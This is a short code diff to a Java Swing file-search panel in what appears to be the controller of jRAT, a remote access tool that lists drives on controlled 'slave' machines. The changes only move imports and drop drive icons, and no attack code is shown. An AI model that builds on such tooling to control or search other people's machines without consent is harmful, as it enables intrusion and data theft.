@@ -1,5 +1,7 @@
 package se.jrat.controller.ui.panels;
 
+import iconlib.IconUtils;
+
 import java.awt.Component;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
@@ -19,6 +21,7 @@ import javax.swing.JScrollPane;
 import javax.swing.JTable;
 import javax.swing.JTextField;
 import javax.swing.JToggleButton;
+import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
@@ -30,8 +33,6 @@ import se.jrat.controller.ui.components.DefaultJTable;
 import se.jrat.controller.ui.frames.FrameRemoteFiles;
 import se.jrat.controller.ui.renderers.JComboBoxIconRenderer;
 import se.jrat.controller.ui.renderers.table.FileSearchTableRenderer;
-import se.jrat.controller.utils.IconUtils;
-import javax.swing.LayoutStyle.ComponentPlacement;
 
 @SuppressWarnings("serial")
 public class PanelSearchFiles extends PanelControlParent {
@@ -211,7 +212,7 @@ public class PanelSearchFiles extends PanelControlParent {
 		JComboBoxIconRenderer renderer = new JComboBoxIconRenderer();
 
 		for (Drive drive : slave.getDrives()) {
-			renderer.addIcon(drive.getName().toLowerCase(), IconUtils.getFileIcon(drive.getName()));
+			renderer.addIcon(drive.getName().toLowerCase(), null);
 		}
 
 		return renderer;
